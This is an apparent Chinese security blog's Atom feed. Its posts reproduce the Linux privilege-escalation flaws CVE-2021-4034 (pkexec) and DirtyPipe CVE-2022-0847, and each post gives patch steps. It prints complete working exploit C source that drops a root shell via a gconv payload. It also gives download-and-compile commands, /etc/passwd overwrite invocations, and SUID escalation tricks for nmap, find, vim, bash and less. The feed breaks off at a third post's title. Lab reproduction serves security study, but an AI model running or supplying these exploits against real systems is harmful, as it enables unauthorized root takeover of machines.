<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>柒妖</title>
  
  <subtitle>Ai si</subtitle>
  <link href="http://aisibuhuipao.github.io/atom.xml" rel="self"/>
  
  <link href="http://aisibuhuipao.github.io/"/>
  <updated>2022-04-10T14:42:37.000Z</updated>
  <id>http://aisibuhuipao.github.io/</id>
  
  <author>
    <name>柒妖</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2021-4034：Linux Polkit 权限提升漏洞复现及修复</title>
    <link href="http://aisibuhuipao.github.io/2022/04/10/CVE-2021-4034%EF%BC%9ALinux%20Polkit%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E4%BF%AE%E5%A4%8D/"/>
    <id>http://aisibuhuipao.github.io/2022/04/10/CVE-2021-4034%EF%BC%9ALinux%20Polkit%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E4%BF%AE%E5%A4%8D/</id>
    <published>2022-04-10T14:42:37.000Z</published>
    <updated>2022-04-10T14:42:37.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2021-4034：Linux-Polkit-权限提升漏洞复现及修复"><a href="#CVE-2021-4034：Linux-Polkit-权限提升漏洞复现及修复" class="headerlink" title="CVE-2021-4034：Linux Polkit 权限提升漏洞复现及修复"></a>CVE-2021-4034：Linux Polkit 权限提升漏洞复现及修复</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>国外安全研究团队在 polkit 的 pkexec 中发现存在的本地权限提升漏洞（CVE-2021-4034）</p><p><strong>关于 Polkit pkexec for Linux</strong><br>Polkit (以前称为 PolicyKit) 是一个用于在类 Unix 操作系统中控制系统范围权限的组件. 它为非特权进程与特权进程通信提供了一种有组织的方式. 也可以使用 polkit 执行具有提升权限的命令, 使用命令 pkexec 后跟要执行的命令 (具有 root 权限) </p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><h4 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a><strong>受影响版本</strong></h4><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2009</span>年<span class="number">5</span>月至今发布的所有 Polkit 版本</span><br><span class="line">注：Polkit预装在CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等多个Linux发行版上，所有存在Polkit的Linux系统均受影响。</span><br></pre></td></tr></tbody></table></figure><h4 id="不受影响版本"><a href="#不受影响版本" class="headerlink" title="不受影响版本"></a><strong>不受影响版本</strong></h4><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">CentOS：</span><br><span class="line">· CentOS <span class="number">6</span>：polkit-<span class="number">0.96</span>-<span class="number">11.</span>el6_10<span class="number">.2</span></span><br><span class="line">· CentOS <span class="number">7</span>：polkit-<span class="number">0.112</span>-<span class="number">26.</span>el7_9<span class="number">.1</span></span><br><span class="line">· CentOS <span class="number">8.0</span>：polkit-<span class="number">0.115</span>-<span class="number">13.</span>el8_5<span class="number">.1</span></span><br><span class="line">· CentOS <span class="number">8.2</span>：polkit-<span class="number">0.115</span>-<span class="number">11.</span>el8_2<span class="number">.2</span></span><br><span class="line">· CentOS <span class="number">8.4</span>：polkit-<span class="number">0.115</span>-<span class="number">11.</span>el8_4<span class="number">.2</span></span><br><span class="line">Ubuntu：</span><br><span class="line">· Ubuntu <span class="number">14.04</span> ESM：policykit-<span class="number">1</span>-<span class="number">0.105</span>-4ubuntu3<span class="number">.14</span><span class="number">.04</span><span class="number">.6</span>+esm1</span><br><span class="line">· Ubuntu <span class="number">16.04</span> ESM：policykit-<span class="number">1</span>-<span class="number">0.105</span>-<span class="number">14.</span>1ubuntu0<span class="number">.5</span>+esm1</span><br><span class="line">· Ubuntu <span class="number">18.04</span> LTS：policykit-<span class="number">1</span>-<span class="number">0.105</span>-20ubuntu0<span class="number">.18</span><span class="number">.04</span><span class="number">.6</span></span><br><span class="line">· Ubuntu <span class="number">20.04</span> LTS：policykit-<span class="number">1</span>-<span class="number">0.105</span>-26ubuntu1<span class="number">.2</span></span><br><span class="line">· Ubuntu <span class="number">21.10</span>：policykit-<span class="number">1</span>-<span class="number">0.105</span>-31ubuntu0<span class="number">.1</span></span><br><span class="line">Debain：</span><br><span class="line">· ：policykit-<span class="number">1</span> <span class="number">0.105</span>-<span class="number">18</span>+deb9u2</span><br><span class="line">· Debain stretch：policykit-<span class="number">1</span> <span class="number">0.105</span>-<span class="number">18</span>+deb9u2</span><br><span class="line">· Debain buster：policykit-<span class="number">1</span> <span class="number">0.105</span>-<span class="number">25</span>+deb10u1</span><br><span class="line">· Debain bullseye：policykit-<span class="number">1</span> <span class="number">0.105</span>-<span class="number">31</span>+deb11u1</span><br><span class="line">· Debain bookworm,bullseye：policykit-<span class="number">1</span> <span class="number">0.105</span>-<span class="number">31.1</span></span><br></pre></td></tr></tbody></table></figure><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>​    1.) 攻击者需要一个本地用户权限<br>​    2.) 恶意文件需要可执行</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>**漏洞环境: **Linux localhost.localdomain 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看内核版本</span></span><br><span class="line">uname -a</span><br><span class="line"><span class="comment"># 查看pkexec版本</span></span><br><span class="line">pkexec --version</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092154291.png" alt="image-20220409215418994"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前id,为本地普通用户</span></span><br><span class="line">id</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092155953.png" alt="image-20220409215511497"></p><p>执行exp提权</p><p><a href="https://github.com/arthepsy/CVE-2021-4034">EXP链接</a></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载 exp</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/arthepsy/CVE-2021-4034.git</span><br><span class="line"><span class="built_in">cd</span> CVE-2021-4034-main</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">gcc cve-2021-4034-poc.c -o exp</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">./exp</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092211712.png" alt="image-20220409221129140"></p><h3 id="EXP文件内容"><a href="#EXP文件内容" class="headerlink" title="EXP文件内容"></a>EXP文件内容</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * blasty-vs-pkexec.c -- by blasty &lt;peter@haxx.in&gt; </span></span><br><span class="line"><span class="comment"> * ------------------------------------------------</span></span><br><span class="line"><span class="comment"> * PoC for CVE-2021-4034, shout out to Qualys</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * ctf quality exploit</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * bla bla irresponsible disclosure</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * -- blasty // 2022-01-25</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fatal</span><span class="params">(<span class="keyword">char</span> *f)</span> </span>{</span><br><span class="line">    perror(f);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">compile_so</span><span class="params">()</span> </span>{</span><br><span class="line">    FILE *f = fopen(<span class="string">"payload.c"</span>, <span class="string">"wb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>) {</span><br><span class="line">        fatal(<span class="string">"fopen"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> so_code[]=</span><br><span class="line">        <span class="string">"#include &lt;stdio.h&gt;\n"</span></span><br><span class="line">        <span class="string">"#include &lt;stdlib.h&gt;\n"</span></span><br><span class="line">        <span class="string">"#include &lt;unistd.h&gt;\n"</span></span><br><span class="line">        <span class="string">"void gconv() {\n"</span></span><br><span class="line">        <span class="string">"  return;\n"</span></span><br><span class="line">        <span class="string">"}\n"</span></span><br><span class="line">        <span class="string">"void gconv_init() {\n"</span></span><br><span class="line">        <span class="string">"  setuid(0); seteuid(0); setgid(0); setegid(0);\n"</span></span><br><span class="line">        <span class="string">"  static char *a_argv[] = { \"sh\", NULL };\n"</span></span><br><span class="line">        <span class="string">"  static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL };\n"</span></span><br><span class="line">        <span class="string">"  execve(\"/bin/sh\", a_argv, a_envp);\n"</span></span><br><span class="line">        <span class="string">"  exit(0);\n"</span></span><br><span class="line">        <span class="string">"}\n"</span>;</span><br><span class="line"></span><br><span class="line">    fwrite(so_code, <span class="built_in">strlen</span>(so_code), <span class="number">1</span>, f);</span><br><span class="line">    fclose(f);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"gcc -o payload.so -shared -fPIC payload.c"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *a_argv[]={ <span class="literal">NULL</span> };</span><br><span class="line">    <span class="keyword">char</span> *a_envp[]={</span><br><span class="line">        <span class="string">"lol"</span>,</span><br><span class="line">        <span class="string">"PATH=GCONV_PATH=."</span>,</span><br><span class="line">        <span class="string">"LC_MESSAGES=en_US.UTF-8"</span>,</span><br><span class="line">        <span class="string">"XAUTHORITY=../LOL"</span>,</span><br><span class="line">        <span class="string">"GIO_USE_VFS="</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[~] compile helper..\n"</span>);</span><br><span class="line">    compile_so();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stat(<span class="string">"GCONV_PATH=."</span>, &amp;st) &lt; <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">if</span>(mkdir(<span class="string">"GCONV_PATH=."</span>, <span class="number">0777</span>) &lt; <span class="number">0</span>) {</span><br><span class="line">            fatal(<span class="string">"mkdir"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">"GCONV_PATH=./lol"</span>, O_CREAT|O_RDWR, <span class="number">0777</span>); </span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">            fatal(<span class="string">"open"</span>);</span><br><span class="line">        }</span><br><span class="line">        close(fd);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stat(<span class="string">"lol"</span>, &amp;st) &lt; <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">if</span>(mkdir(<span class="string">"lol"</span>, <span class="number">0777</span>) &lt; <span class="number">0</span>) {</span><br><span class="line">            fatal(<span class="string">"mkdir"</span>);</span><br><span class="line">        }</span><br><span class="line">        FILE *fp = fopen(<span class="string">"lol/gconv-modules"</span>, <span class="string">"wb"</span>);</span><br><span class="line">        <span class="keyword">if</span>(fp == <span class="literal">NULL</span>) {</span><br><span class="line">            fatal(<span class="string">"fopen"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">fprintf</span>(fp, <span class="string">"module  UTF-8//    INTERNAL    ../payload    2\n"</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[~] maybe get shell now?\n"</span>);</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">"/usr/bin/pkexec"</span>, a_argv, a_envp);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更改文件权限</span></span><br><span class="line">chmod 0755 /usr/bin/pkexec</span><br></pre></td></tr></tbody></table></figure><p>系统检测（参考：深信服千里目安全实验室）</p><p>CentOS 用户可采用如下命令升级到安全版本或更高版本：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum clean all &amp;&amp; yum makecache</span><br><span class="line">yum update polkit -y</span><br></pre></td></tr></tbody></table></figure><p>验证修复，通过以下命令可查看 Polkit 是否为安全版本：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa polkit</span><br></pre></td></tr></tbody></table></figure><p>Ubuntu 用户可采用如下命令升级至安全版本或更高版本：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install policykit-1</span><br></pre></td></tr></tbody></table></figure><p>验证修复，通过以下命令可查看 Polkit 是否为安全版本：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l policykit-1</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CVE-2021-4034：Linux-Polkit-权限提升漏洞复现及修复&quot;&gt;&lt;a href=&quot;#CVE-2021-4034：Linux-Polkit-权限提升漏洞复现及修复&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-4034：Li</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://aisibuhuipao.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>复现DirtyPipe CVE-2022-0847 Linux 内核提权</title>
    <link href="http://aisibuhuipao.github.io/2022/04/10/DirtyPipe%20CVE-2022-0847%20Linux%20%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/"/>
    <id>http://aisibuhuipao.github.io/2022/04/10/DirtyPipe%20CVE-2022-0847%20Linux%20%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83/</id>
    <published>2022-04-10T14:42:37.000Z</published>
    <updated>2022-04-10T14:42:37.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="DirtyPipe-CVE-2022-0847-Linux-内核提权"><a href="#DirtyPipe-CVE-2022-0847-Linux-内核提权" class="headerlink" title="DirtyPipe CVE-2022-0847 Linux 内核提权"></a>DirtyPipe CVE-2022-0847 Linux 内核提权</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>影响范围: Linux内核5.8及以后的版本<br>RT 通过 CVE-2022-0847 可覆盖重写任意可读文件中的数据，可将普通权限的用户提升到特权 root<br>CVE-2022-0847是Linux内核的本地提权漏洞, 原理类似于Dirty Cow linux提权. 目前该漏洞的EXP已经公开, 且处于在野利用.</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这里使用的是Kali系统, 先查看内核版本. </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 影响版本: Linux kernel&gt;=5.8</span></span><br><span class="line"><span class="comment"># 查看内核版本</span></span><br><span class="line">uname -a</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092045736.png" alt="image-20220409204512350"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载exp</span></span><br><span class="line">wget https://haxx.in/files/dirtypipez.c</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">gcc dirtypipez.c -o dirtypipez</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092045042.png" alt="image-20220409204554683"></p><h3 id="1-通过覆盖SUID程序进行提权poc验证"><a href="#1-通过覆盖SUID程序进行提权poc验证" class="headerlink" title="1.) 通过覆盖SUID程序进行提权poc验证"></a>1.) 通过覆盖SUID程序进行提权poc验证</h3><p>SUID (Set User ID) 是文件的一种权限, 允许用户以其所有者的权限执行文件. Linux 二进制文件可以拥有这种类型的权限集有很多原因. 例如,: ping 实用程序需要 root 权限才能打开网络套接字, 但它也需要由标准用户执行, 以验证与其他主机的连接. </p><p>但是，如果某些现有的二进制文件和实用程序具有 SUID 权限, 则可以使用它们将权限提升到 root. </p><p>以下命令可以发现系统上运行的所有 SUID 可执行文件。更具体地说, 这些命令是尝试在用户 root 拥有的具有 SUID 权限位的目录中查找文件, 然后将所有其重定向到 /dev/null 以便仅列出用户有权访问的二进制文件使用权.<br><strong>参考：</strong><a href="https://blog.csdn.net/qq_36119192/article/details/84872644">Linux下用SUID提权</a>、<a href="https://blog.csdn.net/qq_40510246/article/details/95939784?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase">linux提权-SUID提权</a>、<a href="https://www.cnblogs.com/huchong/p/9961625.html">find命令之exec</a><br><a href="https://github.com/mzet-/linux-exploit-suggester">Linux提权审计工具</a></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找具有 root 权限的 SUID的文件</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 使用 /usr/bin/pkexec 进行提权</span></span><br><span class="line">./dirtypipez /usr/bin/pkexec</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092054796.png" alt="image-20220409205443929"><br><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092058888.png" alt="image-20220409205803130"></p><h3 id="2-通过覆写-etc-passwd文件进行提权poc验证"><a href="#2-通过覆写-etc-passwd文件进行提权poc验证" class="headerlink" title="2.) 通过覆写/etc/passwd文件进行提权poc验证"></a>2.) 通过覆写/etc/passwd文件进行提权poc验证</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先备份 /etc/passwd</span></span><br><span class="line">cp /etc/passwd /etc/passwd.upback</span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092107334.png" alt="image-20220409210726975"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载EXP</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/0xIronGoat/dirty-pipe.git</span><br><span class="line"><span class="built_in">cd</span> dirty-pipe</span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">gcc exploit.c -o exploit</span><br></pre></td></tr></tbody></table></figure><p>这里了解一下/etc/passwd中各用户数据每个字段的含义. </p><p><strong>第一个字段:</strong> 是注册名, 也就是用户名称, 这里为root. </p><p><strong>第二个字段:</strong> 口令(passwd), 也就是密码, 这里的x代表的是密码标志, 而不是真正的密码, 真正的密码是保存在 /etc/shadow 文件中. </p><p>注: 在早期的 UNIX 中, 这里保存的就是真正的加密密码串. 现在的Unix/Linux系统中, 口令不再直接保存在passwd文件中, 通常将passwd文件中的口令字段使用一个“x”来代替, 将/etc /shadow作为真正的口令文件, 用于保存包括个人口令在内的数据. </p><p><strong>第三个字段:</strong> 是用户 ID(UID), 这里为0, 代表超级用户. </p><p>注: 0=超级用户、1~499=系统用户（伪用户）、500-65535=普通用户. </p><p><strong>第四个字段:</strong> 是用户的组 ID、这里为0, 代表所属组为0组. </p><p><strong>第五个字段:</strong>  是用户的简单说明, 这里为root, 没有什么特殊作用, 可以不写. </p><p><strong>第六个字段:</strong> 是这个用户的家目录, 这里为/root。</p><p>注：超级用户的家目录是 /root 目录, 普通用户在 /home/ 目录下建立和用户名相同的目录作为家目录, 如 as 用户的家目录就是 /home/as/ 目录. </p><p><strong>第七个字段:</strong> 是用户登录系统时运行的程序名称, 通常是一个Shell程序的全路径名, 可以理解为用户登录之后所拥有的权限, 这里为/bin/bash, 代表可以使用bash程序. </p><p>例: 若为/sbin/nologin代表禁止登录, 一般为系统用户. 若为/usr/bin/passwd, 这是修改用户密码程序的路径, 代表用户只能改自己的密码. </p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 覆写提权</span></span><br><span class="line">./exploit /etc/passwd 5 <span class="string">":0:0:rootx:"</span></span><br><span class="line"><span class="comment"># 如果出现切换至root账户失败的情况, 可能是由于进行覆写提权时将密码置空了, 可以换下面的方法重新尝试</span></span><br><span class="line">./exploit /etc/passwd 5 <span class="string">":0:0:r1234:"</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092126004.png" alt="image-20220409212630265"></p><ul><li><p>nmap</p><p> 较旧版本的Nmap（2.02至5.21）具有交互模式，允许用户执行shell命令。由于Nmap在使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell</p><p> <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092308313.png" alt="image-20220409230814819"></p><p> 该namp版本为4.53，在影响范围，交互模式可以用” <strong>interactive</strong> “参数</p><p> <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092308670.png" alt="image-20220409230839048"></p><p> 出现交互式页面后，使用 !sh 可获得shell</p><p> <img src="https://raw.githubusercontent.com/aisibuhuipao/img/main/202204092309721.png" alt="image-20220409230859374"></p><p> 也可以通过Metasploit模块对Nmap的二进制文件进行权限提升</p> <figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/<span class="built_in">local</span>/setuid_nmap</span><br></pre></td></tr></tbody></table></figure></li><li><p>find</p></li></ul><p>如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br></pre></td></tr></tbody></table></figure><ul><li>vim</li></ul><p>如果vim以SUID运行，就会继承root用户的权限，可以读取系统中所有的文件</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim/vi</span><br><span class="line">:shell</span><br></pre></td></tr></tbody></table></figure><ul><li>bash</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">&gt;<span class="comment"># id</span></span><br></pre></td></tr></tbody></table></figure><ul><li>less/more</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></tbody></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul><li>建议将linux内核升级为安全版本, 目前在 Linux 5.10.102、5.15.25 和 5.16.11版本已修复. </li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;DirtyPipe-CVE-2022-0847-Linux-内核提权&quot;&gt;&lt;a href=&quot;#DirtyPipe-CVE-2022-0847-Linux-内核提权&quot; class=&quot;headerlink&quot; title=&quot;DirtyPipe CVE-2022-0847 </summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://aisibuhuipao.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>复现MySQL CVE-2016-6663 &amp; CVE-2016-6664 组合提权</title>
    <link href="http://aisibuhuipao.github.io/2022/04/10/%E5%A4%8D%E7%8E%B0MySQL%20CVE-2016-6663%20&amp;%20CVE-2016-6664%20%E7%BB%84%E5%90%88%E6%8F%90%E6%9D%83/"/>
